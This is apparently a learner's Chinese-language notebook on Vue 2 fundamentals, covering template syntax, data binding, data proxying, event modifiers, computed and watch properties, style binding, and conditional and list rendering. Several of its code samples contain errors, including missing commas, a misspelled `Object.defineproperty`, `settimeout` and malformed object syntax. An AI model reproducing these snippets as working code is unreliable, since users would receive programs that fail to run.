# 初始vue

~~~VUE
Vue.config.productionTip = false
vue配置里面的生产模式提醒 关闭
~~~

~~~vue
{{}} 中写js表达式 且xxx可自动读取到data中的属性
==注意区分==
js表达式和js代码
a 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方
b 代码（语句） if（）{} for（）{}
~~~

一旦data中的数据发生变化，那么模板中用到改数据的地方也会自动更新

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
      <h1>
        hello{{name,toUpperCase()}}
      </h1>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
name:'cess' }
    }
    })
  </script>
</html>
~~~



# 模板语法 数据绑定

## 模板语法

分为两大类

### 1.插值语法

功能：用于解析标签体内容

写法：{{xxx}}，xxx是js==表达式==，可以直接读取data中的所有区域

### 2.指令语法

功能：用于解析标签 （包括：标签属性、标签体内容、绑定事件….）】

距离：<a ==v-bind==:href=“xxx”> 或者简写为<a ：href="xxx">

xxx同样要写js表达式，可以直接读取到data中的属性

> 备注：Vue中有很多的指令，且形式都是：v-xxx，此处只拿v-bind举例

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
      <h1>
        插值语法
      </h1>
      <h4>
        你好，{{name}}
      </h4>
      <hr />
      <h1>
        指令语法
      </h1>
      <h4>
        <a v-bind:href="tencent.url" x="hello">点我去看</a>
        <a :href="tencent.url" x="hello">点我去看</a>
      </h4>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
name:'lyy' 
      tencent:{
        name:'开端',
        url:'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html'
      }}
    }
    })
  </script>
</html>
~~~

## 数据绑定

Vue中有两种数据绑定方式

​	a.单向绑定v-bind  数据只能从data流向页面

​	b.双向绑定v-model 数据不仅能从data流向页面，还能从页面流向data

​	即可以修改data中声明的属性的值

> 备注：
>
> ​			a.双向绑定一般都在表单上，如==input====select====textarea==
>
> ​			b.双向绑定v-model：value 可以简写为v-model 因为v-model默认收集的就是value

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
    <title>数据绑定</title>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
			单向数据绑定<input type="text" v-bind:value="name"/>
     双向数据绑定<input type="text" v-model:value="name"/>
      
      简写
      单向数据绑定<input type="text" :value="name"/>
      双向数据绑定<input type="text" v-model="name"/>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
        name:'lyy' 
      tencent:{
        name:'开端',
        url:'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html'
      }
      }
    }
    })
  </script>
</html>
~~~

# el与data的两种写法

el有两种写法

​	a.创建Vue实例对象的时候配置el

​	b.先创建Vue实例，随后再通过vm.$mount(‘#root’) 指定el值

data有两种写法

​	a.对象式

> data:{}

​	b.函数式

> data(){return {} }

​	如何选择？

​	目前哪种写法都可以，以后到组件时，data必须使用函数式，否则报错

==一个很重要的原则==

由Vue管理的函数，一定不要写箭头函数，否则this就不是指向vm（即Vue实例）了

~~~vue
<html>
  <header>
  <script type="text/javascript" src="../js/vue.js"></script>
    <title>el和data的两种写法</title>
  </header>
  
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
			<h1>
        你好{{name}}
      </h1>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    
    //el的两种写法
    //const vm = new Vue({
      //el:"#root"
    //})
    //vm.$mount('#root')
    
    
    new Vue({
      el:'#demo' //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      //data两种写法
      // 1 .
      // data(){}
      // 2 .
      // data:{}
      return {
        name:'lyy' 
      	tencent:{
        name:'开端',
        url:'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html'
      }
      }
    }
    })
  </script>
</html>
~~~

# MVVM模型 数据代理

![1](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//1.jpeg)

## MVVM 模型

​	M：模型 model ，data中的数据

​	V：视图View 	模板代码

​	VM：视图模型 ViewModel Vue实例

观察发现：

​	data中所有属性，最后都出现在了vm身上

​	vm身上所有属性及Vue原型身上的所有属性，在Vue模型中都可以直接使用

~~~vue
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Document</title>
<script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>
  <body>
  	<!-- 准备好一个容器 -->
    <div id="demo">
      <h2>
        名称：{{name}}
      </h2>
      <h2>
        测试:{{$options}}
      </h2>
    </div>
  </body>
  <script>
  	Vue.config.productionTip = false //关闭提醒
    new Vue({
      el:'#demo', //el指定当前vue实例为哪个容器服务
      data(){ //data用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
      return {
        name:'lyy' 
      }
    }
    })
  </script>
</html>
~~~

## Vue中的数据代理

==Object.defineproperty()==方法

~~~js
let number = 18
let person = {
	name: '张三',
  sex: '男'
}
Object.defineproperty(person,'age',{
  //注意：当使用了getter或setter方法，不允许使用writable和value这两个属性
  enumerable:true,  //控制属性是否可以枚举 默认值是false
  writable:true,   	//控制属性是否可以修改，默认值为false
  configurable:true	 //控制属性是否可以删除，默认值是false
  get(){
  console.log('有人读取age属性了')
  return number
	}
	set(value){
    console.log('有人修改age属性了')
    number = value
  }
})
console.log(person)
~~~

数据代理：通过一个对象代理对另一个对象中属性的操作

~~~js
let obj = {x:100}
let obj2 = {y:200}
Object.defineproperty(obj2,'x',{
  get () {
    return obj.x
  }
  set(value) {
  obj.x = value
}
})
~~~

![20210811214920](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//20210811214920.png)

Vue将data中的数据拷贝了一份到_data属性中，又将 _data里面的属性提取到Vue实例中，(如name)，通过defineproperty 实现数据代理，这样通过getter/setter操作name，进而操作 _data中的name，而 _data又对data进行数据劫持，实现响应式

~~~html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Vue中的数据代理</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
  </head>
  <body>

    <div id="root">
      <h2>学校名称：{{ name }}</h2>
      <h2>学校地址：{{ address }}</h2>
    </div>

    <script type="text/javascript">
      Vue.config.productionTip = false

      const vm = new Vue({
        el: '#root',
        data: {
          name: '电子科技大学',
          address: '成都'
        }
      })
    </script>

  </body>
</html>
~~~

# 事件处理

## 事件的基本用法

​	1.使用==v-on:xxx==或者简写@xxx绑定事件，其中xxx是事件名

​	2.事件的回调需要配置在==methods==中，最终会在vm上

​	3.methods中配置的函数，不要用**箭头函数**，否则this就不是vm了

​	4.methods中配置的函数，都是被Vue管理的函，this指向的是vm或者组件实例化对象

​	5.@click=“demo”和@click=“demo($event)” 效果一致，但后者可以传参

~~~html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Vue中的数据代理</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
  </head>
  <body>
		<div id="root">
      <h2>欢迎来看{{ name }}的笔记</h2>
      <button @click="showInfo1">点我提示信息(不传参)</button>
      <button @click="showInfo2($event,66)">点我提示信息(传参)</button>
   	</div>
   	<script>
      Vue.config.productionTip = false
      new Vue({
        el:'#root',
        data(){
          return {
            name:'Lyy'
          }
        },
        methods:{
          showInfo1(event){
            console.log(event.target.innerText)
            alert('你好！')
          },
          showInfo2(event,number){
            console.log(event,number)
            console.log(event.target.innerText)
            alert('你好2！')
          }
        }
      })
   	</script>
  </body>
</html>
~~~

![image-20230714095041047](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714095041047.png)

## 事件修饰符

>==prevent==		阻止默认事件(常用)
>
>==stop==		      阻止事件冒泡(常用)
>
>==once==		     事件只能触发一次(常用)
>
>capture   	   使用事件的捕获模式
>
>self					只有event.target是当前操作的元素时才触发元素
>
>passive		    事件的默认行为立即执行，无需等待事件回调执行完毕

修饰符可以连续写，比如可以这样用：@click.prevent.stop = “showInfo”

~~~html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>事件修饰符</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <style>
            .demo1 {
                background-color: #ccc;
                margin-top: 10px;
                padding: 10px;
            }
            button {
                margin-top: 10px;
            }
            .box1 {
                background-color: orange;
                margin-top: 10px;
                padding: 10px;
            }
            .box2 {
                background-color: skyblue;
                padding: 10px;
            }
            .list {
                width: 200px;
                height: 200px;
                background-color: skyblue;
                overflow: auto;
            }
            li {
                height: 100px;
            }
        </style>
    </head>
    <body>
        <div id="root">
            <h2>欢迎来到{{name}}学习</h2>
            <!-- 阻止默认事件 -->
            <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
            <!-- 阻止事件冒泡 -->
            <div class="demo1" @click="showInfo">
                <button @click.stop="showInfo">点我提示信息</button>
                <!-- 修饰符可以连续写 -->
                <!-- <a href="http://www.baidu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
            </div>
            <!-- 事件只触发一次 -->
            <button @click.once="showInfo">点我提示信息</button>
            <!-- 事件的捕获模式 -->
            <div class="box1" @click.capture="showMsg(1)">
                div1
                <div class="box2" @click="showMsg(2)">div2</div>
            </div>

            <!-- 只有event.target时当前操作的元素时才触发事件 -->
            <div class="demo1" @click.self="showInfo">
                <div style="background-color: red" @click="showInfo">点我提示信息</div>
            </div>

            <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
            <!-- scroll是滚动条滚动，passsive没有影响 -->
            <!-- wheel是鼠标滚轮滚动，passive有影响 -->
            <ul @wheel.passive="demo" class="list">
                <li>1</li>
                <li>2</li>
                <li>3</li>
                <li>4</li>
            </ul>
        </div>
        <script>
            Vue.config.productionTip = false
            new Vue({
                el: '#root',
                data: {
                    name: 'lyy'
                },
                methods: {
                    showInfo() {
                        alert('你好！')
                    },
                    showMsg(msg) {
                        console.log(msg)
                    },
                    demo() {
                        for (let i = 0; i < 100000; i++) {
                            console.log('#')
                        }
                        console.log('累坏了')
                    }
                }
            })
        </script>
    </body>
</html>

~~~

键盘事件

​	1.Vue中常用的按键别名

> 回车 enter
>
> 删除 delete 捕获删除和空格建
>
> 退出 esc
>
> 空格 space
>
> 换行 tab 特殊，必须配合keydown使用
>
> 上 up
>
> 下 down
>
> 左 left
>
> 右 right

​	2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意转为kebab-case（多单词小写短横线写法）

​	3.系统修饰键(用法特殊) ctrl alt shift meta（就是win）

​		a.配合keyup使用：按下修饰符的同时，再按下其他键，然后释放键帽，事件才被触发

​				指定ctrl + y 使用 @keyup.ctrl.y

​		b.	配合keydown使用：正常触发事件

​	4.也可以使用keyCode去指定具体的按键（不推荐）

​	5.Vue.config.keyCodes 自定义键名 = 键码  可以去定制案件别名

~~~html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>事件修饰符</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <style>
            .demo1 {
                background-color: #ccc;
                margin-top: 10px;
                padding: 10px;
            }

            button {
                margin-top: 10px;
            }

            .box1 {
                background-color: orange;
                margin-top: 10px;
                padding: 10px;
            }

            .box2 {
                background-color: skyblue;
                padding: 10px;
            }

            .list {
                width: 200px;
                height: 200px;
                background-color: skyblue;
                overflow: auto;
            }

            li {
                height: 100px;
            }
        </style>
    </head>

    <body>
        <div id="root">
            <h2>欢迎打开{{name}}的笔记</h2>
            <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo" />
            <hr />
            <input type="text" placeholder="按下tab提示输入" @keydown.tab="showInfo" />
            <hr />
            <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo" />
            <hr />
        </div>
        <script>
            Vue.config.productionTip = false
            Vue.config.keyCodes.huiche = 13
            new Vue({
                el: '#root',
                data: {
                    name: 'lyy'
                },
                methods: {
                    showInfo(e) {
                        e.target.value = e.target.placeholder
                        console.log(e.target.value)
                    }
                }
            })
        </script>
    </body>
</html>

~~~

![image-20230714111517868](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714205006998.png)

# 计算属性 侦听属性

## 计算属性

1.插值语法实现

~~~html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>事件修饰符</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <style>
            .demo1 {
                background-color: #ccc;
                margin-top: 10px;
                padding: 10px;
            }

            button {
                margin-top: 10px;
            }

            .box1 {
                background-color: orange;
                margin-top: 10px;
                padding: 10px;
            }

            .box2 {
                background-color: skyblue;
                padding: 10px;
            }

            .list {
                width: 200px;
                height: 200px;
                background-color: skyblue;
                overflow: auto;
            }

            li {
                height: 100px;
            }
        </style>
    </head>

    <body>
        <div id="root">
            姓：<input type="text" v-model="firstname" /> <hr>
            名：<input type="text" v-model="lastname" /> <hr>
            全名：<span>{{firstname}}-{{lastname}}</span>
        <script>
            Vue.config.productionTip = false
            new Vue({
                el: '#root',
                data: {
                    firstname:'张',
                    lastname:'三'
                },
            })
        </script>
    </body>
</html>

~~~

2.methods实现

数据发生变化，模板就会被重新解析

~~~html
        <title>methods实现</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    </head>

    <body>
        <div id="root">
            姓：<input type="text" v-model="firstname" />
            <hr />
            名：<input type="text" v-model="lastname" />
            <hr />
            全名：<span>{{fullName()}}</span>
        </div>
        <script>
            Vue.config.productionTip = false
            new Vue({
                el: '#root',
                data: {
                    firstname: '张',
                    lastname: '三'
                },
                methods: {
                    fullName() {
                        return this.firstname + '-' + this.lastname
                    }
                }
            })
        </script>
    </body>
</html>

~~~

3.computed 计算属性

​	1.定义：要用的属性不存在，需要通过已有属性计算得来

​	2.原理：底层借助了Object.defineproperty() 方法提供的getter和setter

​	3.get 函数什么时候指向？

​		a.初次读取时会指向一次

​		b.当依赖的数据发生变化时会被再次调用

​	4.优势：与methods相比，内部有缓存机制（复用），效率更高，调试方便

​	5.备注

​		a.计算属性最总会出现在vm上，直接读取就行

​		b.如果计算属性要被修改，那必须写set函数去响应修改，且set要引起计算时依赖的数据发生变化

​		c.如果计算属性确定不考虑修改，可以用计算属性的简写形式

~~~html
   <title>姓名案例——computed实现</title>
   <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    </head>

    <body>
        <div id="root">
            姓：<input type="text" v-model="firstname" />
            <hr />
            名：<input type="text" v-model="lastname" />
            <hr />
            全名：<span>{{fullName}}</span>
        </div>
        <script>
            Vue.config.productionTip = false
            const vm = new Vue({
                el: '#root',
                data: {
                    firstname: '张',
                    lastname: '三'
                },
                computed: {
                    // 完整写法：
                    // fullName: {
                    //     get() {
                    //         console.log('get被调用了')
                    //         return this.firstname + '-' + this.lastname
                    //     },
                    //     set(value) {
                    //         console.log('set被调用了')
                    //         const arr = value.split('-')
                    //         this.firstname = arr[0]
                    //         this.lastname = arr[1]
                    //     }
                    // }

                    // 简写
                    fullName() {
                        console.log('get被调用了')
                        return this.firstname + '-' + this.lastname
                    }
                }
            })
        </script>
~~~

## 侦听属性

~~~html
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>天气案例</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWeather">切换天气</button>
    </div>
<script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            }
        })
</script>
~~~

### 侦听属性基本用法

### watch监视属性

1.当被监视的变化时,回调函数自动调用，进行相关操作

2.监视的属性必须存在，才能进行监视，既可以监视data，也可以监视计算属性

3.配置项属性 ==immediate：false==，改为true，则初始化时调用一次handler(newvalue,oldvalue)

4.监视有两种写法

​	a. 创建Vue时传入warch：{}配置

​	b.通过vm.$watch()监视

~~~html
    <title>天气案例-监视属性</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWeather">切换天气</button>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            //方式一
            // watch: {
            //     isHot: {
            //         immediate: true,
            //         handler(newvalue, oldvalue) {
            //             console.log('isHot被修改了', newvalue, oldvalue)
            //         }
            //     }
            // }
        })

        //方式二
        vm.$watch('isHot', {
            immediate: true,
            handler(newvalue, oldvalue) {
                console.log('isHot被修改了', newvalue, oldvalue)
            }
        })
    </script>
~~~

### 深度侦听

​	1.Vue中的watch默认不监测对象内部值的改变(只监视表面一层)

​	2.再watch中配置deep：true可以监测对象内内部值的改变

注意：

​	1.Vue自身可以监测对象内部值的改变，但是Vue提供的默认值不可以

​	2.使用watch时根据监视数据的具体结构，决定是否使用深度监视



~~~html
<title>天气案例-深度监视</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <h3>a的值是:{{ numbers.a }}</h3>
        <button @click="numbers.a++">点我让a+1</button>
        <h3>b的值是:{{ numbers.b }}</h3>
        <button @click="numbers.b++">点我让b+1</button>
        <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
        {{numbers.c.d.e}}
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                numbers: {
                    a: 1,
                    b: 1,
                    c: {
                        d: {
                            e: 100
                        }
                    }
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            watch: {
                // isHot: {
                //     immediate: true,
                //     handler(newvalue, oldvalue) {
                //         console.log('isHot被修改了', newvalue, oldvalue)
                //     }
                // }
                numbers: {
                    immediate: true,
                    deep: true,
                    handler(newvalue, oldvalue) {
                        console.log('numbers改变了')
                    }
                }
            }
        })
    </script>
~~~

![image-20230714202215407](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714202942366.png)



### 侦听属性简写

如果侦听属性除了handler属性没有其他配置项的话，可以进行简写

~~~html
watch:{
	isHot(newvalue,oldvalue){
		console.log('isHot被修改了',newvalue,oldvalue)
}
}
~~~

## 计算属性vs监听属性

computed和watch之间的区别

- ==computed==能完成的功能，==watch==也能够完成

- ==watch==能完成的功能，==computed==不一定能够完成

两个重要的小原则

- 所有被Vue管理的函数，最好写城普通函数，这样this的指向才是vm或者组件实例对象
- 所有不被Vue管理的函数，(定时器的回调函数、ajax的回调函数、Promise的回调函数)最好写成箭头函数，这样this的指向才是vm或者组件实例对象![image-20230714202942366](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714202215407.png)

使用计算属性

~~~js
new Vue({
  el:'#root',
  data:{
    firstname:'zhang',
    lastname:'san'
  },
  computed:{
    fullName:(){
    return this.firstname + '-' + this.lastname
  }
  }
})
~~~



使用监听属性

~~~js
new Vue({
  el:'#root',
  data:{
    firstname:'张',
    lastname:"三",
    fullname:'张-三'
  },
  watch:{
    firstname(val){
      settimeout(()=>{
        this.fullname=val+'-'+this.lastname
      },1000)
    }.
    lastname(val){
  		this.fullname=this.firstname+'-'+val
		}
  }
})
~~~

# 绑定样式 条件渲染

## 绑定样式

class样式

- ​	写法==:class=“”==,xxx可以是字符串，数组，对象
- ==:style===“[a,b]” 其中a、b是样式对象
- :style  =  “{fontSize:xxx}” 其中xxx是动态值
  - 字符串写法适用于：类名不确定，要动态获取
  - 数组写法适用于：要绑定多个样式，个数不确定，名字也不确定
  - 对象写法适用于：要绑定多个样式，个数确定，名字确定，但不确定用不用

~~~html
 <style>
        .basic {
            width: 300px;
            height: 50px;
            border: 1px solid black;
        }

        .happy {
            border: 3px solid red;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }

        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: skyblue;
        }

        .normal {
            background-color: #bfa;
        }

        .atguigu1 {
            background-color: yellowgreen;
        }

        .atguigu2 {
            font-size: 20px;
            text-shadow: 2px 2px 10px red;
        }

        .atguigu3 {
            border-radius: 20px;
        }
    </style>
</head>

<body>
    <div id="root">
        <!-- 绑定class样式，-字符串写法。适用于：样式类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div><br><br>

        <!-- 绑定class，数组写法，适用于：要绑定的样式个数不确定，名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div><br><br>

        <!-- 绑定class样式，对象写法，适用于：要绑定的样式确定，名字确定，但不确定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div><br><br>
        <!-- 绑定style样式--对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div><br><br>
        <!-- 绑定style样式--数组写法 -->
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                mood: 'normal',
                classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
                classObj: {
                    atguigu1: false,
                    atguigu2: false
                },
                styleObj: {
                    fontSize: '40px',
                    color: 'red'
                },
                styleObj2: {
                    backgroundColor: 'orange'
                },
                styleArr: [
                    {
                        fontSize: '40px',
                        color: 'blue'
                    },
                    {
                        backgroundColor: "gray"
                    }
                ]
            },
            methods: {
                changeMood() {
                    const arr = ['happy', 'sad', 'normal']
                    const index = Math.floor(Math.random() * 3)
                    this.mood = arr[index]
                }
            },
        })
    </script>
~~~

![image-20230714205006998](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714111517868.png)

## 条件渲染

### v-if 

​	写法跟if else 语法类似

​	v-if=“表达式”

​	v-else-if=“表达式”

​	v-else

适用于：切换频率较低的场景

注意：v-if和v-else-if和v-else 一起使用，但要求其结构不能被打断

### v-show

​	写法：v-show=“表达式”

​	适用于：切换频率较高的场景

​	特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉display：none

==备注==：使用v-if的时候，元素可能无法获取到，而使用v-show一定可以获取到

> template标签不影响结构，页面html中不会有此标签，但只能配合v-if 不能配合v-show

~~~js
    <div id="root">
        <h2>当前n的值是{{n}}</h2>
        <button @click="n++">点我n+1</button>

        <!-- 使用v-show条件渲染 -->
        <!-- <h2 v-show="false">欢迎来到{{name}}</h2>
        <h2 v-show="1==1">欢迎来到{{name}}</h2> -->

        <!-- 使用v-if条件渲染 -->
        <!-- <h2 v-if="false">欢迎来到{{name}}</h2>
        <h2 v-if="1===1">欢迎来到{{name}}</h2> -->

        <!-- v-if和v-show -->
        <!-- <div v-show="n===1">angular</div>
        <div v-show="n===2">React</div>
        <div v-show="n===3">Vue</div> -->

        <!-- v-else和v-else-if -->
        <div v-if="n===1">angular</div>
        <div v-else-if="n===2">React</div>
        <div v-else-if="n===3">Vue</div>
        <div v-else>haha </div>


    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                name: " lyy", n: 0
            },
        }) 
    </script>
~~~

# 列表渲染 数据监视

## 列表渲染

### 基本列表

==v-for==指令

- 用于展示列表数据
- 语法：<li v-for="(item,index) of item" :key="index">这里key可以是index，更好的是遍历对象的唯一标识
- 可遍历：数组、对象、字符串(用的少)、指定次数（用的少）

~~~js
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <h3>人员列表（遍历数组）</h3>
        <ul>
            <li v-for="(p,index) of person" :key="index">{{p.name}}-{{p.age}}</li>
        </ul>
        <!-- 遍历对象 -->
        <h3>汽车信息(遍历对象)</h3>
        <ul>
            <li v-for="(value,key) of car" :key="key">{{key}}-{{value}}</li>
        </ul>
        <!-- 遍历字符串 -->
        <h3>测试遍历字符串</h3>
        <ul>
            <li v-for="(char,index) of str" :key="index">{{char}}-{{index}}</li>
        </ul>
        <!-- 遍历指定次数 -->
        <h3>遍历指定次数</h3>
        <ul>
            <li v-for="(number,index) of 5" :key="index">{{index}}-{{number}}</li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                person: [
                    { id: '001', name: '张三', age: 18 },
                    { id: '002', name: 'lisi', age: 19 },
                    { id: '003', name: 'wangwu', age: 20 }
                ],
                car: {
                    name: '奥迪a8',
                    price: "70w",
                    color: '黑色'
                },
                str: 'hello'
            },
        }) 
    </script>
~~~

![image-20230714211320091](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714211320091.png)



## key的作用与原理

![**key问题1**](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//key问题1.png)

![key问题2](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//key问题2.png)

面试题：react vue中的key有什么作用？(key的内部原理)

​	1.虚拟dom中key的作用：key是虚拟DOM中对象的表示，当数据放生变化时，vue会根据新数据生成新的虚拟dom，锁喉vue进行新虚拟DOM与旧虚拟DOM的差异比较，比较规则如下

#### 	2.对比规则

​		a.旧 虚拟DOM 中找到了与新 虚拟DOM 相同的 Key

​			1.若虚拟DOM 中内容没变，直接使用之前的真实DOM

​			2.若虚拟DOM 中内容改变，则生成新的真实DOM ，随后替换掉页面中之前的真实DOM

#### 	3.用index作为key可能会引发的问题

​		a.若对数据进行逆序添加、逆序删除等==破坏顺序操作==，会产生没有必要的==真实DOM== 更新===》页面效果没问题，但是效率低

​		b.若结构中还包括==输入类的dom== ：会产生错误==dom==更新==》界面有问题

#### 	4.开发中如何选择key？

​			a.最好使用每条数据的==唯一标识==作为==key==，比如id，手机号，身份证号码，学号等唯一值

​			b.如果不存在对数据的逆序添加删除等破坏顺序的操作，仅用于渲染列表，使用==index==作为==key==是没有问题的

~~~js
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <h3>人员列表（遍历数组）</h3>
        <button @click.once="add">添加一个老刘</button>
        <ul>
            <li v-for="(p,index) of person" :key="index">{{p.name}}-{{p.age}}<input type="text"></li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                person: [
                    { id: '001', name: '张三', age: 18 },
                    { id: '002', name: 'lisi', age: 19 },
                    { id: '003', name: 'wangwu', age: 20 }
                ],
            },
            methods: {
                add() {
                    const p = { id: "004", name: '老刘', age: 40 }
                    this.person.unshift(p)
                }
            }
        }) 
    </script>
~~~

![image-20230714212428779](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715095923074.png)

## 列表过滤

~~~html
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <h3>人员列表</h3>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p,index) of filPersons" :key="p.id">
                {{ p.name }}-{{ p.age }}-{{ p.sex }}
            </li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        // 用watch实现
        // new Vue({
        //     el: '#root',
        //     data: {
        //         keyWord: '',
        //         person: [
        //             { id: '001', name: '马冬梅', age: 19, sex: '女' },
        //             { id: '002', name: '周冬雨', age: 20, sex: '女' },
        //             { id: '003', name: '周杰伦', age: 21, sex: '男' },
        //             { id: '004', name: '温兆伦', age: 22, sex: '男' }
        //         ],
        //         filPerson: []
        //     },
        //     watch: {
        //         keyWord: {
        //             immediate: true,
        //             handler(val) {
        //                 this.filPersons = this.person.filter((p) => {
        //                     return p.name.indexOf(val) !== -1
        //                 })
        //             }
        //         }
        //     }
        // }

        // 用computed实现
        new Vue({
            el: '#root',
            data: {
                keyWord: '',
                person: [
                    { id: '001', name: '马冬梅', age: 19, sex: '女' },
                    { id: '002', name: '周冬雨', age: 20, sex: '女' },
                    { id: '003', name: '周杰伦', age: 21, sex: '男' },
                    { id: '004', name: '温兆伦', age: 22, sex: '男' }
                ],
                filPerson: []
            },
            computed: {
                filPersons() {
                    return this.person.filter((p) => {
                        return p.name.indexOf(this.keyWord) !== -1
                    })
                }
            }
        }
        ) 
    </script>
~~~

![image-20230714213317339](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714213317339.png)

数据监视

更新时的一个问题

